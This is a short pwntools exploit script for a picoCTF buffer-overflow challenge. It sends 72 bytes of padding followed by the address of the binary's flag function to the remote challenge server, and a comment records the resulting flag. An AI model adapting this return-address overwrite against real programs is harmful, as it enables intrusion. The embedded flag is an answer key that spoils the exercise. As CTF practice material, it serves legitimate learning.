from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
break *0x00000000004012d1
continue
'''.format(**locals())

exe = './vuln'
elf = context.binary = ELF(exe, checksec=False)
# p = start()
p = remote("saturn.picoctf.net", 61929)

payload = flat(
    cyclic(72),
    elf.sym[b'flag'] + 5,
)

p.sendlineafter(b": ", payload)
p.interactive()

# picoCTF{b1663r_15_b3773r_be31178c}